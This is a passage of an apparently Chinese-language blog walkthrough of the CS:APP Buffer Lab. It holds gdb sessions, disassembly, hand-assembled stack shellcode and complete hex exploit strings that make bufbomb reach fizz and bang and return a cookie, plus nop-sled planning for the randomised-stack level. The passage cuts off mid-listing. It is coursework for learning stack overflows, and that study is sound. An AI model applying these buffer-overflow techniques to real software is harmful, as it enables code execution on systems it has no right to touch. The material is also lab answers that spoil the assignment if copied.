<p>此时，已经跳转到 <code>fizz</code>函数哪里了，但现在的<code>%ebp</code>的值是<code>0x00000000</code>,不过幸好有<code>mov    %esp,%ebp</code>这条指令，把<code>%ebp</code>拯救回来，才能使<code>mov    0x8(%ebp),%eax</code>能得到我们放入的cookie。这时的内存状态是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-03.png" alt="level-01"></p>
<p>执行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level1.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Fizz!: You called fizz(0x52f8c747)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2 Firecracker"></a>Level 2 Firecracker</h4><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int global_value = 0;</div><div class="line">void bang(int val)</div><div class="line">&#123;</div><div class="line">    if (global_value == cookie) &#123;</div><div class="line">	    printf(&quot;Bang!: You set global_value to 0x%x\n&quot;, global_value);</div><div class="line">    	validate(2);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: global_value = 0x%x\n&quot;, global_value);</div><div class="line"></div><div class="line">	exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。那怎么设置呢？<strong>在栈上构建一段代码，然后在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang</strong>。</p>
<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) break getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas getbuf</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) print /x $ebp</div><div class="line">$1 = 0x55683450</div><div class="line">(gdb) print /x $esp</div><div class="line">$2 = 0x55683418</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>通过在gdb中添加断点并观察，我们可以确定在执行函数<code>getbuf</code>时，栈底<code>%ebp</code>的值为<code>0x55683450</code>。</p>
<p>接下来我们要通过gcc和objdump生成攻击代码。我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，攻击代码的作用就是设置全解变量的值为cookie的值，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x52f8c747, %eax</div><div class="line">mov %eax, 0x804c1ec  ;设置全局变量</div><div class="line">add $16, %esp ;修改栈顶</div><div class="line">ret ;返回</div></pre></td></tr></table></figure>
<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o</code>将攻击代码汇编和反汇编，具体的命令和结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gcc -m32 -c level2-exploit.s </div><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ objdump -d level2-exploit.o</div><div class="line"></div><div class="line">level2-exploit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 47 c7 f8 52       	mov    $0x52f8c747,%eax</div><div class="line">   5:	a3 ec c1 04 08       	mov    %eax,0x804c1ec</div><div class="line">   a:	83 c4 10             	add    $0x10,%esp</div><div class="line">   d:	c3                   	ret</div></pre></td></tr></table></figure>
<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 34 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 47 c7 f8 52 a3 ec c1 </div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">22 90 04 08  			/* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
<p>可以知道，我们的攻击思路是：<strong>在getbuf函数返回的时候，先将<code>pc</code>跳转到我们刚刚设计的攻击代码开始的地方，执行我们设计的攻击代码，设置全局变量的值，然后在跳转到<code>bang</code>函数执行。</strong></p>
<p>可能疑惑为什么要这么做？是怎么知道全局变量的地址的呢？为什么要修改栈指针且要加16呢？接下来一一解答：</p>
<p>对于全局变量的指针，我们可以通过<code>bang</code>函数的反汇编代码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">08049022 &lt;bang&gt;:</div><div class="line"> 8049022:	55                   	push   %ebp</div><div class="line"> 8049023:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049025:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049028:	a1 ec c1 04 08       	mov    0x804c1ec,%eax</div><div class="line"> 804902d:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8049033:	75 1e                	jne    8049053 &lt;bang+0x31&gt;</div><div class="line"> 8049035:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049039:	c7 04 24 90 a1 04 08 	movl   $0x804a190,(%esp)</div><div class="line"> 8049040:	e8 9b f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049045:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</div><div class="line"> 804904c:	e8 93 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8049051:	eb 10                	jmp    8049063 &lt;bang+0x41&gt;</div><div class="line"> 8049053:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049057:	c7 04 24 79 9f 04 08 	movl   $0x8049f79,(%esp)</div><div class="line"> 804905e:	e8 7d f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049063:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 804906a:	e8 21 f9 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
<p>在level-1中我们知道<code>0x804c1e4</code>是cookie的地址，那么这里<code>0x804c1ec</code>显然就是全局变量的地址了。</p>
<p>从getbuf返回时，我们的内存是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-04.png" alt="level-2"></p>
<p>我们很巧妙的把pc指向了我们设置的攻击代码处，然后开始执行我们设置的代码，当指行完 <code>add    $0x10,%esp</code>的时候，内存空间是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-05.png" alt="level-2"></p>
<p>然后执行<code>ret</code>，把栈顶的bang函数的首地址弹出给pc，在改变全局变量的值后，顺利地跳转到bang函数开始执行。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level2.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Bang!: You set global_value to 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3 Dynamite"></a>Level 3 Dynamite</h4><p>Your job for this level is to supply an exploit string that will cause getbuf to return your cookie back to<br>test, rather than the value 1. You can see in the code for test that this will cause the program to go<br>“Boom!.” Your exploit code should set your cookie as the return value, restore any corrupted state, push<br>the correct return location on the stack, and execute a ret instruction to really return to test.</p>
<p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着我们需要做：</p>
<ul>
<li>在栈上执行机器代码</li>
<li>要恢复test函数的栈帧，也就是恢复test的<code>$esp</code>和<code>%ebp</code>，让test函数能继续执行</li>
</ul>
<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
<p>对于该阶段，我们的思路：和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码，修改返回值，修复破坏的<code>$ebp</code>,然后跳转到正确的地址</p>
<p>攻击代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov 0x804c1e4, %eax   /* move cookie to %eax as return value */</div><div class="line">mov $0x55683480, %ebp  /* recovery %ebp */</div><div class="line">push 0x8048c93       /* return address */</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>在攻击代码里，我们设置了返回值、恢复<code>%ebp</code>的值，但是并没有刻意恢复<code>$esp</code>,不过此时的<code>%esp</code>也是正确的，请各位猿友思考下这个问题。</p>
<p>对于这么得到旧的<code>%ebp</code>和正确返回地址的值，我们可以通过gdb调试，查看内存的值得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) b getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) x /10xw $ebp</div><div class="line">0x55683450 &lt;_reserved+1037392&gt;:	0x55683480	0x08048c93	0x55686018	0x00000b60</div><div class="line">0x55683460 &lt;_reserved+1037408&gt;:	0x55685ff0	0xb7e7143f	0xb7fd1ac0	0x08049f4b</div><div class="line">0x55683470 &lt;_reserved+1037424&gt;:	0x5568348c	0x7902ca39</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>做法就是在执行getbuf函数的时候，通过查看<code>%ebp</code>后面的内存的值，能得到旧的<code>%ebp</code>的值为<code>0x55683480</code>,正确的返回地址的值<code>0x08048c93</code>，和我们设计的攻击代码里的是一一对应的。</p>
<p>然后和阶段二一样汇编攻击代码和反汇编得到指令序列：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">level3-exlpoit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	a1 e4 c1 04 08       	mov    0x804c1e4,%eax</div><div class="line">   5:	bd 80 34 68 55       	mov    $0x55683480,%ebp</div><div class="line">   a:	ff 35 93 8c 04 08    	pushl  0x8048c93</div><div class="line">  10:	c3                   	ret</div></pre></td></tr></table></figure>
<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a1 e4 c1 04 08 bd 80 34</div><div class="line">68 55 68 93 8c 04 08 c3</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 28 34 68 55</div></pre></td></tr></table></figure></p>
<p>如果你看过我们阶段2的做法，会发现这里跟阶段二不一样了，我们现在把攻击代码放在了<code>buf</code>的开始位置了，因为这样能更方便的维护`%esp·。</p>
<p>执行完<code>getbuf</code>后的内存结构:</p>
<p><img src="/images/CSAPP-BufferLab-06.png" alt="level-3"></p>
<p>注意到此时的<code>%esp</code>是在正确的位置的，也就是说现在的<code>%esp</code>就是函数test在调用getbuf前的值。</p>
<p>当执行完<code>push 0x8048c93</code>，把正确的返回地址入栈，此时<code>%esp</code>减 4 ，不回稍后执行 <code>ret</code>把正确地址pop给pc时，<code>%esp</code>会加4，回到正确的位置，恢复test函数的栈帧。 </p>
<p>当执行完<code>push 0x8048c93</code>时的内存空间：</p>
<p><img src="/images/CSAPP-BufferLab-07.png" alt="level-3"></p>
<p>执行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level3.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Boom!: getbuf returned 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4 Nitroglycerin"></a>Level 4 Nitroglycerin</h4><p>For this level, we have gone the opposite direction, making the stack positions even less stable than they normally are. Hence the name “nitroglycerin”—an explosive that is notoriously unstable.</p>
<p>When you run BUFBOMB with the command line flag “-n,” it will run in “Nitro” mode. Rather than calling<br>the function getbuf, the program calls a slightly different function getbufn:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int getbufn()</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">   char buf[512];</div><div class="line"></div><div class="line">   Gets(buf);</div><div class="line"></div><div class="line">   return 1;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数与getbuf所不同的是，分配了512字节的字符数组，而调用getbufn的函数会在栈中随机分配一段存储区，这导致getbufn使用的栈基址EBP随机变化。此外，在Nitro模式运行时，bufbomb会要求提供5次输入字符串，每一次都要求getbufn的返回值为实验者的cookie。</p>
<p>Level4的其他要求与Level3相同，但它要求提供同一个恶意代码，在getbufn被调用5次后，最终仍返回到testn函数中，且不能破坏testn的堆栈状态，并使返回值为cookie。</p>
<p>总结一下，编写恶意代码需要满足（1）恢复testn的栈帧；（2）设置 getbufn 返回值为cookie；（3）跳转到testn中调用getbufn后的下一指令地址。</p>
<p>首先，先说一下如何解决对于栈上地址不固定，二通过溢出输入字符串写入栈的跳转地址需要固定的问题。依据英文PDF，我们可以痛<code>nop sleds</code>的技术，大概就是：在不清楚有效机器代码的入口地址时，可以在有效机器代码前以大量的NOP机器指令填充，只要跳转地址处于这些nop 上就能到达有效机器代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">空操作指令指令格式：NOP</div><div class="line"></div><div class="line">   说明：NOP是英语“No Operation”的缩写。NOP无操作数，所以称为“空操作”。</div><div class="line"></div><div class="line">   执行NOP指令只使程序计数器PC加1，所以占用一个机器周期。</div></pre></td></tr></table></figure></p>
<p>同时，由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：<strong>跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。</strong></p>
<p>有了上面的基础，我们首先来看看getbufn的汇编代码与getbuf有什么区别！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">08048be6 &lt;getbufn&gt;:</div><div class="line"> 8048be6:	55                   	push   %ebp</div><div class="line"> 8048be7:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048be9:	81 ec 18 02 00 00    	sub    $0x218,%esp</div><div class="line"> 8048bef:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax</div><div class="line"> 8048bf5:	89 04 24             	mov    %eax,(%esp)</div><div class="line"> 8048bf8:	e8 4d ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048bfd:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c02:	c9                   	leave  </div><div class="line"> 8048c03:	c3                   	ret    </div><div class="line"></div><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure>
<p>发现在调用getbuf时，ebp的内容比esp内容大0x28，而在getbufn中大0x218。</p>
<p>通过查看testn的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">08048c1c &lt;testn&gt;:</div><div class="line"> 8048c1c:	55                   	push   %ebp</div><div class="line"> 8048c1d:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c1f:	83 ec 28             	sub    $0x28,%esp</div><div class="line"> 8048c22:	c7 45 f4 ef be ad de 	movl   $0xdeadbeef,-0xc(%ebp)</div><div class="line"> 8048c29:	e8 b8 ff ff ff       	call   8048be6 &lt;getbufn&gt;</div><div class="line"> 8048c2e:	8b 55 f4             	mov    -0xc(%ebp),%edx</div><div class="line"> 8048c31:	81 fa ef be ad de    	cmp    $0xdeadbeef,%edx</div><div class="line"> 8048c37:	74 0e                	je     8048c47 &lt;testn+0x2b&gt;</div><div class="line"> 8048c39:	c7 04 24 a8 a0 04 08 	movl   $0x804a0a8,(%esp)</div><div class="line"> 8048c40:	e8 fb fc ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 8048c45:	eb 36                	jmp    8048c7d &lt;testn+0x61&gt;</div><div class="line"> 8048c47:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8048c4d:	75 1e                	jne    8048c6d &lt;testn+0x51&gt;</div><div class="line"> 8048c4f:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8048c53:	c7 04 24 d4 a0 04 08 	movl   $0x804a0d4,(%esp)</div><div class="line"> 8048c5a:	e8 81 fc ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8048c5f:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)</div><div class="line"> 8048c66:	e8 79 04 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8048c6b:	eb 10                	jmp    8048c7d &lt;testn+0x61&gt;</div><div class="line"> 8048c6d:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8048c71:	c7 04 24 f7 9e 04 08 	movl   $0x8049ef7,(%esp)</div><div class="line"> 8048c78:	e8 63 fc ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8048c7d:	c9                   	leave  </div><div class="line"> 8048c7e:	c3                   	ret</div></pre></td></tr></table></figure></p>
<p>可以知道在调用getbufn前，<code>$ebp = $esp+0x28</code>，同时也能得到正确返回地址为<code>0x8048c2e</code>,所以可构造攻击代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">leal 0x28(%esp), %ebp  /* recovery %ebp */</div><div class="line">mov 0x804c1e4, %eax   /* move cookie to %eax as return value */</div><div class="line">push $0x8048c2e       /* return address */</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>指令序列为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">8d 6c 24 28</div><div class="line">a1 e4 c1 04 08</div><div class="line">68 2e 8c 04 08</div><div class="line">c3</div></pre></td></tr></table></figure></p>
<p>攻击代码设计好了，现在要做的就是找一个合适的地址，以确保在栈随机的情况下也能执行我们的攻击代码。现在我们就看看-n模式下getbufn的 <code>$ebp</code>是怎么变化的。</p>
<p>使用gdb调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div 